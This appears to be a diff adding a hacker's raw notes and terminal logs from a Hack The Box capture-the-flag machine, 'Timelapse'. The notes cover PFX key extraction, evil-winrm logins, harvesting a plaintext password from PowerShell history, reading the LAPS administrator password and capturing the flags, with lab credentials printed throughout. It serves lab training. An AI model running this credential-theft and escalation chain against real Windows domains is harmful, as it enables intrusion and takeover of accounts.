@@ -294,4 +294,234 @@ Session completed.
 TIPS: PFX
 https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
 
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Timelapse_10.10.11.152# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
+Enter Import Password:
+
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
+Enter Import Password:
+
+TIPS: WinRM Port 5985 5986
+
+──(kali㉿kali)-[~/htb/htb/Timelapse_10.10.11.152]
+└─$ pc evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+*Evil-WinRM* PS C:\Users\legacyy\Documents> hostname
+dc01
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
+dir
+*Evil-WinRM* PS C:\Users\legacyy> dir
+
+
+    Directory: C:\Users\legacyy
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/25/2021   8:25 AM                Desktop
+d-r---       10/25/2021   8:22 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+cd *Evil-WinRM* PS C:\Users\legacyy> cd Desktop
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/10/2022   2:13 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+02b05e8d3c9c721d94d6c2ea0c855327
+
+PE
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
+User name                    legacyy
+Full Name                    Legacyy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2021 12:17:10 PM
+Password expires             Never
+Password changeable          10/24/2021 12:17:10 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   7/10/2022 11:07:43 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *Development
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-ComputerInfo -Property "*version"
+
+
+WindowsCurrentVersion              : 6.3
+WindowsVersion                     : 1809
+
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
+C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> dir C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+
+
+    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+timelapse\svc_deploy
+*Evil-WinRM* PS C:\Users\legacyy\Downloads> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
+
+
+PSComputerName              : localhost
+RunspaceId                  : 045920df-5c8d-44de-905e-9a186c266aec
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-Mcs-AdmPwd               : -VIdwe+}JSU29.50!&.2Kh9y
+ms-Mcs-AdmPwdExpirationTime : 133023499988534487
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+PSComputerName    : localhost
+RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
+DistinguishedName : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DB01
+ObjectClass       : computer
+ObjectGUID        : d38b3265-230f-47ae-bdcd-f7153da7659d
+SamAccountName    : DB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1606
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
+DistinguishedName : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : WEB01
+ObjectClass       : computer
+ObjectGUID        : 897c7cfe-ba15-4181-8f2c-a74f88952683
+SamAccountName    : WEB01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1607
+UserPrincipalName :
+
+PSComputerName    : localhost
+RunspaceId        : 045920df-5c8d-44de-905e-9a186c266aec
+DistinguishedName : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
+DNSHostName       :
+Enabled           : True
+Name              : DEV01
+ObjectClass       : computer
+ObjectGUID        : 02dc961a-7a60-4ec0-a151-0472768814ca
+SamAccountName    : DEV01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1608
+UserPrincipalName :
+
+┌──(kali㉿kali)-[~/htb/htb/Timelapse_10.10.11.152]
+└─$ pc evil-winrm -S -u 'Administrator' -p '-VIdwe+}JSU29.50!&.2Kh9y' -i 10.10.11.152
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd ..
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+21b19a3c9dfe9e5b4d683ba5132cdfd4
 
